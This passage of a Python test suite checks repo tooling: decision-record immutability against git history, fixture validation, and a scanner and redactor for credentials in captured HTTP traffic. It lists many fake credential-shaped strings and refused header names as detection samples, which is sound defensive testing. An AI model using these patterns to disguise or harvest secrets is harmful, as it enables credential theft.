                     ".claude/skills/run-it/SKILL.md": good, ".claude/skills/other/SKILL.md": "# Other\n",
                     ".claude/skills/third/SKILL.md": good.replace("description: Run it, when a story asks for it.", "description:"),
                     ".claude/skills/fourth/SKILL.md": good.replace("run-it", "fourth").replace("description: Run it, when a story asks for it.",
                                                                                                 "description: >\n")})
        problems = check_context._skills(root)
        for words in ("run-it/SKILL.md: the root AGENTS.md does not point to it", "other/SKILL.md: opens with no frontmatter",
                      "third/SKILL.md: is named run-it; a skill is named for its directory", "third/SKILL.md: no description",
                      "fourth/SKILL.md: no description"):
            self.assertTrue(caught(problems, words), words)
        planted = clone({".claude/skills/run-a-platform-trial/SKILL.md": good.replace("run-it", "run-a-platform-trial")
                         + "See `tools/gone.py`.\n", ".claude/skills/other/SKILL.md": "# Other\n"})
        problems = check_context.run(planted)
        for words in ("SKILL.md: names tools/gone.py", "other/SKILL.md: the root AGENTS.md does not point to it",
                      "other/SKILL.md: opens with no frontmatter"):
            self.assertTrue(caught(problems, words), words)

    def test_a_second_copy_of_the_review_standard_is_caught(self):
        root = tree({"docs/standards/review.md": "# Review\n", "docs/standards/release.md": "# Release\n"})
        problems = check_context._standards(root)
        self.assertTrue(caught(problems, "the review standard is"))
        self.assertTrue(caught(problems, "release.md: the standards are"))

    def test_only_the_design_record_is_exempt(self):
        root = tree({"docs/architecture/review.md": "See `scripts/gone.sh`.\n", "docs/notes/a.md": "x\n",
                     "docs/architecture-notes.md": "x\n"})
        self.assertEqual([p.name for p in check_context._markdown(root)], ["architecture-notes.md", "a.md"])

    def test_a_cell_may_hold_a_pipe_and_a_second_table_is_not_a_boundary(self):
        self.assertEqual(check_context._cells("| `A | B` | x \\| y | `tools/x.py` | "), ["`A | B`", "x | y", "`tools/x.py`"])
        body = "| B | Check |\n|---|---|\n| b | c |\n\nMore.\n\n| Other | Table |\n|---|---|\n| d | e |\n"
        self.assertEqual(check_context._rows(body), [["b", "c"]])

    def test_the_whole_check_reads_every_document(self):
        lessons = (ROOT / "docs" / "lessons.md").read_text()
        planted = {"docs/lessons.md": lessons + "\nSee `tools/gone.py`.\n",
                   "docs/decisions/0001-one-repo-and-a-kernel-that-does-no-io.md": "# 0001. Gutted\n",
                   "docs/standards/tests.md": "# Tests\n", "kernel/AGENTS.md": "# kernel/\n"}
        problems = check_context.run(clone(planted))
        for words in ("docs/lessons.md: names tools/gone.py", "0001-one-repo-and-a-kernel-that-does-no-io.md: no section",
                      "docs/standards/tests.md states no rule", "kernel/AGENTS.md: no table of rules"):
            self.assertTrue(caught(problems, words), words)


RECORD = ("# 0001. One thing\n\nStatus: accepted.\n\n## Decision\n\nWe do one thing.\nAnd only that.\n\n"
          "## Why\n\nTwo things split the work.\n\n## Boundaries\n\n| Boundary | Check |\n|---|---|\n"
          "| One thing | `tools/check_x.py` |\n")
FIRST = "docs/decisions/0001-one-thing.md"
LATER = "docs/decisions/0002-two-things.md"
REPLACED = RECORD.replace("Status: accepted.", "Status: replaced by `%s`, which holds\nthe rule in force." % LATER)
REPLACING = RECORD.replace("# 0001. One thing", "# 0002. Two things").replace(
    "Status: accepted.", "Status: accepted. Replaces `%s`,\nand keeps all of it." % FIRST)
EDITED = "title, Decision or Why changed"


def history(files: dict = None) -> pathlib.Path:
    """A repo whose main, on origin, holds decision 0001 and `files`; the working tree is main, unchanged."""
    root = tree(dict({FIRST: RECORD}, **(files or {})))
    git(root, "init", "-q", "-b", "main")
    committed(root, "main")
    return root


def committed(root: pathlib.Path, message: str) -> None:
    """Commit all of `root` on its branch, and when that is main, move origin's main to it."""
    git(root, "add", "-f", ".")
    git(root, "-c", "user.name=T", "-c", "user.email=t@example.com", "commit", "-q", "-m", message)
    if git(root, "branch", "--show-current").strip() == "main":
        git(root, "update-ref", "refs/remotes/origin/main", "HEAD")


def edited(root: pathlib.Path, files: dict, commit: bool = False) -> pathlib.Path:
    """`root` with `files` written over it, and committed on a branch when `commit`."""
    for rel, text in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(text)
    if commit:
        git(root, "checkout", "-q", "-b", "change")
        committed(root, "change")
    return root


def refused(files: dict, words: str, base: dict = None) -> bool:
    """Does the check refuse `files` written over main, as `base` has it, saying `words`?"""
    return caught(check_decisions.run(edited(history(base), files)), words)


@contextlib.contextmanager
def outside_actions():
    """Run as anywhere but GitHub Actions, where a tree with no .git is an export and is skipped."""
    with mock.patch.dict(os.environ):
        os.environ.pop("GITHUB_ACTIONS", None)
        yield


class Decisions(unittest.TestCase):
    def test_an_edit_to_a_decision_is_refused(self):
        for commit in (False, True):     # in the working tree, or committed on the branch
            with self.subTest(commit=commit):
                root = edited(history(), {FIRST: RECORD.replace("one thing.", "two things.")}, commit)
                self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: its " + EDITED))
        # The whole record is compared but its Status and Boundaries, so no heading or line break gets round it.
        ways = {
            "a second Decision, the original last": RECORD.replace("one thing.", "two things.")
            + "\n## Decision\n\nWe do one thing.\nAnd only that.\n",
            "an amendment as a heading of its own": RECORD.replace("only that.\n", "only that.\n\n# Amendment\n\nTwo.\n"),
            "a section of its own": RECORD.replace("## Boundaries", "## Amendment\n\nTwo things now.\n\n## Boundaries"),
            "a line before the Decision": RECORD.replace("Status: accepted.\n", "Status: accepted.\n\nIt no longer holds.\n"),
            "a fence around the original": RECORD.replace("And only that.", "Two.\n```\n## Decision\nAnd only that.\n```"),
            "the lines broken elsewhere": RECORD.replace("one thing.\nAnd only", "one thing. And\nonly"),
            "the title": RECORD.replace("# 0001. One thing", "# 0001. Two things"),
            "text after the table": RECORD + "\nAnd we now do two things.\n",
            "a second table": RECORD + "\n| Decision |\n|---|\n| We do two things |\n",
        }
        for name, text in ways.items():
            with self.subTest(name):
                self.assertTrue(refused({FIRST: text}, EDITED))

    def test_an_edit_to_why_is_refused(self):
        self.assertTrue(refused({FIRST: RECORD.replace("split the work", "share the work")}, "its " + EDITED))
        gone = RECORD.replace("## Why\n\nTwo things split the work.\n\n", "")
        self.assertTrue(refused({FIRST: gone}, EDITED))

    def test_an_edit_with_status_naming_the_record_that_replaces_it_is_allowed(self):
        for commit in (False, True):
            with self.subTest(commit=commit):
                root = edited(history(), {FIRST: REPLACED, LATER: REPLACING}, commit)
                self.assertEqual(check_decisions.run(root), [])
        # The Status is all that changes: the Decision and Why stay as they were.
        self.assertTrue(refused({FIRST: REPLACED.replace("one thing.", "two."), LATER: REPLACING}, EDITED))
        # The record named is new in this change, exists, comes later, and says in its own Status that it replaces this.
        self.assertTrue(refused({FIRST: REPLACED}, "not new in this change", base={LATER: REPLACING}))
        self.assertTrue(refused({FIRST: REPLACED}, "which does not exist"))
        earlier = REPLACED.replace("0002-two-things", "0000-nothing")
        self.assertTrue(refused({FIRST: earlier, "docs/decisions/0000-nothing.md": REPLACING}, "not a later record"))
        for status in ("Status: accepted.", "Status: accepted. Replaces `docs/decisions/0009-x.md`.",
                       "Status: accepted. It does not replace `%s`." % FIRST):
            with self.subTest(status):
                self.assertTrue(refused({FIRST: REPLACED, LATER: RECORD.replace("Status: accepted.", status)},
                                        "does not say it replaces this one"))
        # "replaced by" opens the Status, in decision 0012's words; it is not a phrase found anywhere in it.
        for status in ("Status: accepted, not replaced by `%s`." % LATER, "Status: accepted. Replaced by `%s`." % LATER,
                       "Status: replaced by `%s`" % LATER.replace(".md", ".mdx"), "Status: superseded.",
                       "Status: replaced by %s." % LATER):
            with self.subTest(status):
                self.assertTrue(refused({FIRST: RECORD.replace("Status: accepted.", status), LATER: REPLACING},
                                        "its Status changes only to say what replaces it"))
        # Once replaced, the Status is fixed: not changed back, nor pointed at another record.
        third = "docs/decisions/0003-three.md"
        status = REPLACED.split("\n\n")[1]
        for again in ("Status: accepted.", "Status: replaced by `%s`." % third):
            with self.subTest(again):
                self.assertTrue(refused({FIRST: REPLACED.replace(status, again), third: REPLACING.replace("0002", "0003")},
                                        "is fixed from then on", base={FIRST: REPLACED, LATER: REPLACING}))

    def test_a_new_record_that_replaces_one_sets_that_ones_status(self):
        # A new record that says it replaces another is held to it: that record is on main, earlier, and in this
        # change says it is replaced by this one.
        third = "docs/decisions/0003-three.md"
        cases = {
            "the record it replaces left as it was": ({LATER: REPLACING}, None, "whose Status does not say"),
            "a record that does not exist": ({LATER: REPLACING.replace(FIRST, "docs/decisions/0000-none.md")}, None,
                                             "0000-none.md, which is not a record main holds"),
            "a record new in this change": ({LATER: REPLACING.replace(FIRST, third), third: RECORD}, None,
                                            "0003-three.md, which is not a record main holds"),
            "a later record": ({LATER: REPLACING.replace(FIRST, third),
                                third: RECORD.replace("Status: accepted.", "Status: replaced by `%s`." % LATER)},
                               {third: RECORD}, "0003-three.md, which is not an earlier record"),
            "a record another one replaces": ({FIRST: REPLACED.replace(LATER, third), LATER: REPLACING,
                                               third: REPLACING.replace("0002", "0003")}, None,
                                              "0002-two-things.md: it replaces docs/decisions/0001-one-thing.md, whose"),
            # Every record it names is replaced: one more, left as it was or not there at all, is refused.
            "one more, unchanged": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s` and `%s`" % (FIRST, third))}, {third: RECORD},
                "0003-three.md, which is not an earlier record"),
            "one more, earlier and unchanged": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s`, `docs/decisions/0000-zero.md`" % FIRST)}, {"docs/decisions/0000-zero.md": RECORD},
                "0000-zero.md, whose Status does not say"),
            "one more that is not there": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s` and `docs/decisions/0000-none.md`" % FIRST)}, None,
                "0000-none.md, which is not a record main holds"),
            "said another way": ({FIRST: REPLACED, LATER: REPLACING.replace("accepted. Replaces", "proposed. Replaces")},
                                 None, "only as 'Status: accepted. Replaces'"),
            "the path without backticks": ({LATER: REPLACING.replace("`%s`" % FIRST, FIRST)}, None,
                                           "only as 'Status: accepted. Replaces'"),
        }
        # The whole declaration is read: past it, no word of replacing and no record's path, in either record.
        missing = "docs/decisions/0000-missing.md"
        for status in ("Status: accepted. Replaces `%s`. It also replaces `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`, and SUPERSEDES `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`, and keeps all of `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`; and `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s` in part." % FIRST):
            cases[status] = ({FIRST: REPLACED, LATER: REPLACING.replace(REPLACING.split("\n\n")[1], status)}, None,
                             "0002-two-things.md: its Status says what it replaces only as")
        for status in ("Status: replaced by `%s`. It is also replaced by `%s`." % (LATER, third),
                       "Status: replaced by `%s`, with `%s`." % (LATER, third)):
            cases[status] = ({FIRST: RECORD.replace("Status: accepted.", status), LATER: REPLACING}, None,
                             "0001-one-thing.md: its Status changes only to say what replaces it")
        for name, (files, base, words) in cases.items():
            with self.subTest(name):
                self.assertTrue(refused(files, words, base=base), name)

    def test_a_boundary_row_added_is_allowed(self):
        added = RECORD + "| Another thing | `tests/test_x.py::test_y` |\n"
        moved = added.replace("`tools/check_x.py`", "`tools/check_y.py`")
        for text in (added, moved, added.replace("| One thing |", "|  One  thing |")):
            with self.subTest(text=text):
                self.assertEqual(check_decisions.run(edited(history(), {FIRST: text}, commit=True)), [])
        # A row is not taken away, and its Boundary does not change.
        for text in (RECORD.replace("| One thing | `tools/check_x.py` |\n", ""),
                     RECORD.replace("| One thing |", "| Two things |"),
                     RECORD.replace("| One thing | `tools/check_x.py` |", "| One thing | or two | `tools/check_x.py` |")):
            with self.subTest(text=text):
                self.assertTrue(refused({FIRST: text}, "the row 'One thing"))

    def test_a_new_record_is_allowed(self):
        self.assertEqual(check_decisions.run(edited(history(), {LATER: REPLACING.replace("Replaces", "Adds to")},
                                                    commit=True)), [])
        self.assertEqual(check_decisions.run(history()), [])
        # A record taken away, or renamed, is not a new one.
        root = history()
        (root / FIRST).rename(root / "docs/decisions/0001-another-name.md")
        self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: is gone"))

    def test_a_record_has_one_status_first_no_comment_and_is_no_link(self):
        ways = {
            "a second Status": RECORD.replace("## Why", "Status: replaced by `%s`.\n\n## Why" % LATER),
            "a Status below the Decision": RECORD.replace("Status: accepted.\n\n", "") + "\nStatus: accepted.\n",
            "a line before the Status": RECORD.replace("Status:", "Note.\n\nStatus:"),
            "a hidden comment": RECORD.replace("And only that.", "And only that.<!-- and two -->"),
            "a second Boundaries": RECORD + "\n## Boundaries\n\n| B | C |\n|---|---|\n",
            "no title": RECORD.replace("# 0001. One thing\n", ""),
            "a title that is not a heading": RECORD.replace("# 0001.", "0001."),
        }
        for name, text in ways.items():
            for rel in (FIRST, LATER):      # a record in the base, or a new one
                with self.subTest(name, rel=rel):
                    self.assertTrue(refused({rel: text}, "%s: it " % rel))
        root = history()
        os.symlink(str(root / FIRST), str(root / LATER))
        self.assertTrue(caught(check_decisions.run(root), "0002-two-things.md: is a link"))
        root = history()
        git(root, "mv", "docs/decisions", "elsewhere")
        os.symlink("../elsewhere", str(root / "docs" / "decisions"))
        self.assertTrue(caught(check_decisions.run(root), "docs/decisions: is a link"))
        self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: is gone"))

    def test_a_worktree_is_compared_with_where_its_branch_left_main(self):
        # A worktree's .git is a file, and the check compares there as in any clone.
        root = history()
        other = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "worktree"
        git(root, "worktree", "add", "-q", "-b", "change", str(other))
        self.assertTrue((other / ".git").is_file())
        self.assertEqual(check_decisions.run(other), [])
        edited(other, {FIRST: RECORD.replace("one thing.", "two things.")})
        self.assertTrue(caught(check_decisions.run(other), "0001-one-thing.md: its " + EDITED))
        # Main moves on after the branch left it, and adds a record the branch has not got: that is not gone.
        root = history()
        git(root, "branch", "change")
        committed(edited(root, {LATER: REPLACING.replace("Replaces", "Adds to")}), "later")
        git(root, "checkout", "-q", "change")
        self.assertFalse((root / LATER).exists())
        self.assertEqual(check_decisions.run(root), [])

    def test_a_base_that_cannot_be_read_fails_and_only_an_export_is_skipped(self):
        # With a .git and no base to read the check fails, and never passes.
        bare = tree({FIRST: RECORD})
        git(bare, "init", "-q")
        shallow = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "shallow"
        git(SCRATCH.name, "clone", "-q", "--depth", "1", (history() / ".git").as_uri(), str(shallow))
        no_origin = history()
        git(no_origin, "update-ref", "-d", "refs/remotes/origin/main")
        for name, root, words in (("no commit", bare, "failed"), ("shallow", shallow, "shallow"),
                                  ("no origin", no_origin, "git rev-parse failed")):
            with self.subTest(name):
                self.assertTrue(caught(check_decisions.run(root), "cannot be compared"))
                self.assertIn(words, check_decisions.described(root))
        with mock.patch("shutil.which", return_value=None):
            self.assertTrue(caught(check_decisions.run(history()), "git is not on PATH"))
        # A replacement ref is not read: the base is main as it was committed, not as a replace says.
        root = edited(history(), {FIRST: RECORD.replace("one thing.", "two things.")}, commit=True)
        git(root, "replace", git(root, "rev-parse", "main").strip(), "HEAD")
        self.assertTrue(caught(check_decisions.run(root), "its " + EDITED))
        # An export has no .git, and so no history: the comparison is skipped, and verify says so; but not in CI.
        export = tree({FIRST: RECORD.replace("one thing.", "two things.")})
        with outside_actions():
            self.assertEqual(check_decisions.run(export), [])
            self.assertIn("skipped", check_decisions.described(export))
        with mock.patch.dict(os.environ, GITHUB_ACTIONS="true"):
            self.assertTrue(caught(check_decisions.run(export), "in GitHub Actions the checkout always writes one"))
        # A record's form needs no base, and is held in an export too.
        with outside_actions():
            self.assertTrue(caught(check_decisions.run(tree({FIRST: RECORD + "<!-- -->\n"})), "an HTML comment"))


def fixture(**fields) -> str:
    """The example fixture, as text, with `fields` written over it."""
    data = json.loads((ROOT / "examples" / "trial.json").read_text())
    data.update(fields)
    return json.dumps(data, indent=2)


GROUNDING = (ROOT / "sim" / "grounding.py").read_text()


def grounded(fixture_path: str, trials: str = '("P-28",)') -> str:
    """sim/grounding.py with the rule P-28 asks grounded by `fixture_path`, and asked by `trials`."""
    rule = '("P-28",), None)'
    assert GROUNDING.count(rule) == 1
    return GROUNDING.replace(rule, '%s, "%s")' % (trials, fixture_path))


TAIL = "A" * 36
# What the security pass tried to slip through. Each must be refused wherever it stands in a fixture.
SHAPED = {
    "ghp": "gh" + "p_" + TAIL, "gho": "gh" + "o_" + TAIL, "ghu": "gh" + "u_" + TAIL, "ghs": "gh" + "s_" + TAIL,
    "ghr": "gh" + "r_" + TAIL, "short ghs": "gh" + "s_short", "pat": "github" + "_pat_11" + "A" * 20 + "_" + "b" * 59,
    "after an underscore": "x_gh" + "p_" + TAIL, "after a digit": "%3Agh" + "p_" + TAIL, "upper case": "GH" + "P_" + TAIL,
    "raw url": "https://raw.githubusercontent.com/o/r/main/f?to" + "ken=GHSAT0AAAAAACAAAAAAAAAAAAAAAAAAZZZZZZ",
    "ghsat": "GHS" + "AT0AAAAAACAAAAAA", "jwt": "eyJ" + "hbGciOiJSUzI1NiJ9.eyJpc3MiOiIxMjMifQ.sig", "short jwt": "eyJ" + "0eXAi.eyJ.sig",
    "token scheme": "tok" + "en abcdef0123456789abcdef0123456789abcdef",
    "basic": "Bas" + "ic eC1hY2Nlc3MtdG9rZW46Z2hzX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
    "bearer": "Bear" + "er abc", "bearer in capitals": "BEAR" + "ER abc",
    "set-cookie in a string": "Set-" + "Cookie: user_session=abcdef; path=/", "authorization in a string": "Authoriz" + "ation: x",
    "user and password in a url": "https://don:hunt" + "er2@github.com/combsmith/x.git",
    "token in a url": "https://x-access-tok" + "en:gh" + "s_" + TAIL + "@github.com/o/r",
    "signed url": "https://productionresultssa0.blob.core.windows.net/x?sv=2019&s" + "ig=AbCdEf%2Bxyz%3D&se=2026",
    "amazon signature": "https://objects.githubusercontent.com/x?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Sign" + "ature=abcd1234",
    "amazon credential": "https://x/y?X-Amz-Cred" + "ential=AKIDEXAMPLE%2F2026",
    "hex beside a keyword": "access_tok" + "en=" + "a1" * 20, "runner registration": "AABF3JGZDX3P5PMEXLND6TS6FCWO6",
    "jit config": "encoded_jit" + "_config", "private key": "-----BEGIN OPENSSH PRIV" + "ATE KEY-----\nb3Blbn",
    "private key body": "MIIEowIBAAKCAQEA" + "x" * 60, "openssh key body": "b3BlbnNzaC1rZXktdjE" + "AAAAB",
    "base64 of a token": base64.b64encode(("gh" + "p_" + TAIL).encode()).decode(),
    "base64 of a runner's credentials": base64.b64encode(json.dumps({".runner": "x", ".credentials_rsaparams": "k"}).encode()).decode(),
    "anthropic": "sk-" + "ant-oat01-" + "A" * 40,
    "base64 of a token behind a byte that does not print": base64.b64encode(("\x00gh" + "p_" + TAIL).encode()).decode(),
}
# What a fixture keeps: GitHub's ordinary words must not be refused.
PLAIN = ["6dcb09b5b57875f334f61aebed695e2e4193db5e", "a" * 40, "application/vnd.github+json", "MDQ6VXNlcjE=",
         "https://api.github.com/repos/combsmith/x/check-runs/4", "2026-10-15T14:02:11Z", "Requires authentication",
         "highs and lows", "bearer", "factory-run-r1", "Resource not accessible by integration"]
REFUSED_KEYS = ["Authorization", "AUTHORIZATION", "Authorization ", "Proxy-Authorization", "Set-Cookie", "cookie",
                "x-github-otp", "x-access-token", "github_token", "GITHUB_TOKEN", "accessToken", "installation_token",
                "encoded_jit_config", "x-jit-config", "jwt", "auth", "Auth ", "webhook_secret", "client_secret", "password", "credentials", "token"]
PLAIN_KEYS = ["token_type", "input_tokens", "output_tokens", "location", "key", "value", "author", "external_id"]
# Not caught, by design or as a known hole: a commit hash alone is no credential; a token split across two strings
# and a one-time code alone have no shape. The field names a header or field must have are the guard there.


class Trials(unittest.TestCase):
    def test_a_fixture_that_is_misnamed_or_invalid_is_caught(self):
        root = clone({"trials/P-12.json": fixture(trial="P-13"), "trials/P-12.retry.json": "{}",
                      "trials/notes.md": "x\n", "trials/P12.json": fixture(), "trials/P-9.json/P-9.json": fixture(trial="P-9")})
        problems = check_trials.run(root)
        for words in ("trials/P-12.json: records trial P-13", "trials/P-12.retry.json: $: missing",
                      "trials/notes.md: trials/ holds fixtures only", "trials/P12.json: trials/ holds fixtures only",
                      "trials/P-9.json: trials/ holds fixtures only"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(check_trials.run(clone({"trials/P-12.json": fixture(), "trials/P-12.retry.json": fixture()})), [])

    def test_a_credential_in_a_fixture_is_caught(self):
        for name, value in sorted(SHAPED.items()):
            self.assertTrue(check_trials._credentials({"note": value}, ""), name)
            self.assertTrue(check_trials._credentials({"a": [[{"b": [value]}]]}, ""), name)
        for value in PLAIN:
            self.assertEqual(check_trials._credentials({"note": value}, ""), [], value)
        for key in REFUSED_KEYS:
            self.assertTrue(check_trials._credentials({"a": [[{key: "x"}]]}, ""), key)
        for key in PLAIN_KEYS:
            self.assertEqual(check_trials._credentials({key: "x"}, ""), [], key)
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "x"
        data["exchanges"][0]["response"]["body"]["note"] = SHAPED["ghs"]
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].request.headers.Authorization is a field"))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].response.body.note holds something shaped"))
        self.assertFalse(any(SHAPED["ghs"] in p for p in problems), "a problem never repeats the credential")

    def test_a_header_a_fixture_may_not_keep_is_caught(self):
        data = json.loads(fixture())
        data["exchanges"][1]["response"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][1]["response"]["headers"]["X-RateLimit-Used"] = "2"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "exchanges[1].response.headers.X-GitHub-SSO is not a header a fixture may keep"))
        self.assertFalse(caught(problems, "X-RateLimit-Used"))

    def test_every_example_of_a_fixture_and_the_folder_notes_are_scanned(self):
        data = json.loads((ROOT / "examples" / "invalid" / "trial.run-outside-the-canary.json").read_text())
        data["exchanges"][0]["request"]["headers"]["authorization"] = "x"
        notes = (ROOT / "trials" / "AGENTS.md").read_text() + "\nFor example " + SHAPED["ghs"] + "\n"
        problems = check_trials.run(clone({"examples/invalid/trial.run-outside-the-canary.json": json.dumps(data),
                                           "examples/trial.json": fixture(note=SHAPED["jwt"]), "trials/AGENTS.md": notes}))
        self.assertTrue(caught(problems, "examples/invalid/trial.run-outside-the-canary.json: exchanges[0].request.headers"))
        self.assertTrue(caught(problems, "examples/trial.json: note holds something shaped like a credential"))
        self.assertTrue(caught(problems, "trials/AGENTS.md: holds something shaped like a credential"))

    def test_code_that_reads_the_canary_is_caught(self):
        name = "combsmith/" + check_trials.CANARY
        root = clone({"tools/fetch.py": "REPO = %r\n" % name, ".github/workflows/trial.yml": "repository: %s\n" % name,
                      "Makefile": "trial:\n\tgh api repos/%s\n" % name, "config/where.json": '{"repo": "%s"}' % name,
                      "docs/notes.md": name + "\n", "README.md": name + "\n", "trials/P-12.json": fixture(),
                      "sim/deep/er/x.py": name, "corpus/x.json": name,
                      ".claude/worktrees/other/.git": "gitdir: elsewhere\n", ".claude/worktrees/other/tools/x.py": name})
        problems = check_trials.run(root)
        for where in ("tools/fetch.py", ".github/workflows/trial.yml", "Makefile", "config/where.json", "sim/deep/er/x.py"):
            self.assertTrue(caught(problems, where + ": names the canary repo"), where)
        # Another working tree, and the corpus make_corpus.py writes, are not this repo's: tools/walk.py skips both.
        for where in ("docs/notes.md", "README.md", "trials/P-12.json", "examples/trial.json", "trial.schema.json", "worktrees",
                      "corpus", "config/apps.json", "schemas/apps.schema.json", "examples/invalid/apps."):
            self.assertFalse(caught(problems, where), where)

    def test_a_fixture_named_for_a_rule_must_exist_and_validate(self):
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-28.json")}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: trials/P-28.json does not exist"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-28.json"), "trials/P-28.json": "{}"}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: trials/P-28.json is not a valid fixture"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-12.json"), "trials/P-12.json": fixture()}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: trials/P-12.json records P-12, and P-28 asks this"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("examples/trial.json")}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: examples/trial.json is not a fixture in trials/"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-28.json", "()"),
                                           "trials/P-28.json": fixture(trial="P-28")}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: no trial asks this; add one to section 6 first"))
        root = clone({"sim/grounding.py": grounded("trials/P-28.json", '("P-7", "P-28")'),
                      "trials/P-28.json": fixture(trial="P-28")})
        self.assertEqual(check_trials.run(root), [])
        self.assertFalse(caught(check_trials.unverified(root), "the_pusher_is_the_last_pusher"))
        self.assertTrue(caught(check_trials.unverified(), "the_pusher_is_the_last_pusher"))

    def test_a_rule_of_the_fake_that_is_not_listed_is_caught(self):
        world = (ROOT / "sim" / "world.py").read_text()
        problems = check_trials.run(clone({"sim/world.py": world + "\n# GitHub: a_rule_nobody_listed\n"}))
        self.assertTrue(caught(problems, "sim/world.py applies a_rule_nobody_listed, which sim/grounding.py does not list"))
        listed = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_rule_never_applied", "It is so", (), None),', 1)
        problems = check_trials.run(clone({"sim/grounding.py": listed}))
        self.assertTrue(caught(problems, "a_rule_never_applied is listed in sim/grounding.py and applied nowhere in sim/world.py"))
        twice = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_tick_can_be_lost", "It is so", ("P-8",), None),', 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": twice})), "a_tick_can_be_lost is listed twice"))
        for broken in ("RULES = rules()\n", "RULES = (('Not a code', 'x', ('P-1',), None),)\n", "RULES = (('x', 'x'),)\n",
                       "x = 1\n", "RULES = (('a_tick_can_be_lost', 'x', 'P-8', None),)\n"):
            self.assertTrue(check_trials.run(clone({"sim/grounding.py": broken})), broken)

    def test_verify_prints_every_rule_no_fixture_grounds(self):
        listed = check_trials.rules()
        codes = [code for code, _, _, fixture in listed if fixture is None]
        grounded = [code for code, _, _, fixture in listed if fixture is not None]
        self.assertTrue(codes)
        self.assertEqual(len(check_trials.unverified()), len(codes))
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["suite"] = suite
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()) as said:
                self.assertEqual(verify.main([]), 0)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        for code in codes:
            self.assertIn("unverified: " + code, said.getvalue())
        for code in grounded:
            self.assertNotIn("unverified: %s:" % code, said.getvalue())

    def test_the_check_runs_alone_before_anything_is_added(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(check_trials.main(ROOT), 0)
            self.assertEqual(check_trials.main(clone({"trials/notes.txt": "x\n"})), 1)
        self.assertIn("trials/notes.txt", said.getvalue())

    def test_only_a_fixture_may_name_a_model_or_the_proof_of_concept(self):
        said = json.dumps({"model": "claude-" + "opus-5-5", "repo": "combsmith/" + check_repo.FOREIGN})
        problems = check_repo.run(tree({"trials/P-13.json": said, "trials/old/P-13.json": said, "trials/P-13.txt": said,
                                        "config/x.json": said}))
        for where in ("trials/old/P-13.json", "trials/P-13.txt", "config/x.json"):
            self.assertTrue(caught(problems, where + ": names a model"), where)
            self.assertTrue(caught(problems, where + ": names the proof-of-concept repo"), where)
        self.assertFalse(caught(problems, "trials/P-13.json"))


class Redaction(unittest.TestCase):
    """`tools/redact_trial.py` runs on the raw capture, outside the repo, before anyone reads it."""

    def redact(self, raw: str) -> tuple:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (folder / "raw").write_text(raw)
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(redact_trial.main([str(folder / "raw"), str(folder / "out")]), 0)
        return (folder / "out").read_text(), said.getvalue()

    def test_a_drafted_fixture_comes_out_with_no_credential(self):
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "tok" + "en " + SHAPED["ghs"]
        data["exchanges"][0]["request"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][0]["response"]["body"]["token"] = SHAPED["runner registration"]
        data["exchanges"][0]["response"]["body"]["expires_at"] = "2026-10-15T15:02:11Z"
        data["exchanges"][0]["response"]["body"]["clone"] = SHAPED["token in a url"]
        data["exchanges"][0]["response"]["body"]["blob"] = SHAPED["base64 of a runner's credentials"]
        data["exchanges"][0]["response"]["body"]["notes"] = [SHAPED[name] for name in sorted(SHAPED)]
        out, said = self.redact(json.dumps(data))
        kept = json.loads(out)
        self.assertEqual(check_trials._credentials(kept, ""), [])
        self.assertEqual(check_trials._headers(kept), [])
        self.assertEqual(validate(kept, json.loads((ROOT / "schemas" / "trial.schema.json").read_text())), [])
        body = kept["exchanges"][0]["response"]["body"]
        self.assertEqual((body["expires_at"], body["external_id"]), ("2026-10-15T15:02:11Z", "factory-run-r1"))
        self.assertNotIn("token", body)
        self.assertNotIn("clone", body)
        self.assertEqual(body["notes"], [])
